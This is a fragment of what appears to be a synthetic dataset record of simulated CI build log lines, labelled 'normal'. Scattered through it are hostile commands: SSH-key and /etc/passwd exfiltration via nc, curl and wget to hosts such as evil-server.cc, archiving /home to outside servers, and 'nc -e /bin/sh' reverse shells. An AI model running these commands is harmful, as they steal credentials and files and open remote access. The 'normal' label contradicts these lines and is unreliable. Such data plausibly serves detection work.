          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 111.0.62.137 28101",
          "npm notice: package.json updated",
          "\u2713 All checks passed",
          "[12:46:23] WARN: Deprecated API usage",
          "WARNING: prettier has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Verifying...",
          "Optimizing 17 modules...",
          "Transforming 211 files...",
          "\u2717 build failed with exit code 31",
          "OK",
          "pip install: Successfully installed prettier-4.15",
          "WARNING: webpack has known vulnerabilities",
          "Compiling src/utils.go...",
          "Finished.",
          "[12:46:23] INFO: Cache refreshed",
          "Step 12/17: Building",
          "[12:46:23] ERROR: Connection failed",
          "Success!",
          "[12:46:23] DEBUG: Loading configuration",
          "Sending 137MB of data to data-exfil.ru",
          "pip install: Successfully installed webpack-5.12",
          "Fetching from https://github.com/package.json",
          "Artifact uploaded: dist.zip (32MB)",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "Compiling lib/service.java...",
          "Platform: win32-x64",
          "Cache miss for key-4805",
          "TLS handshake completed",
          "Uploading artifact 'build' (25 files)",
          "  PASS: test_db_connect (384ms)",
          "Image pulled successfully",
          "Using Node.js 20.7.3",
          "  PASS: test_db_connect (224ms)",
          "Snapshots: 1 passed, 33 total",
          "Connection established",
          "Pulling image: node:latest",
          "[12:46:23] INFO: Cache refreshed",
          "Step 8/20: Running migrations",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling lib/utils.go...",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "[12:46:23] DEBUG: Loading configuration",
          "Bundling main.css",
          "Pulling image: node:latest",
          "Artifact downloaded: 13MB",
          "Fetching submodules...",
          "[12:46:23] DEBUG: Initializing service",
          "Uploading artifact 'coverage' (36 files)",
          "Waiting...",
          "nc -e /bin/sh 9.162.107.240 1343",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_api_health",
          "Creating production build...",
          "Transforming 920 files...",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Sending 232MB of data to malicious-pool.xyz",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 173.0.31.154 20317",
          "Ready.",
          "[12:46:23] INFO: Processing request",
          "Compiling lib/utils.go...",
          "Cache saved successfully",
          "Step 6/21: Linting",
          "Cache hit for key-4698",
          "nc -e /bin/sh 152.241.205.27 17868",
          "Sending 123MB of data to evil-server.cc",
          "Compiling lib/index.js...",
          "\u2717 build failed with exit code 8",
          "Switched to branch 'bugfix/task-780'",
          "Completed.",
          "Cache hit for key-2209",
          "npm install: added 368 packages",
          "Connection established",
          "OK",
          "Cache saved successfully",
          "Artifact uploaded: dist.zip (32MB)",
          "[12:46:23] INFO: Starting build process",
          "FAILED: test_cache_hit",
          "POST /data - 202 (122ms)",
          "[12:46:23] WARN: Deprecated API usage",
          "Already up to date.",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}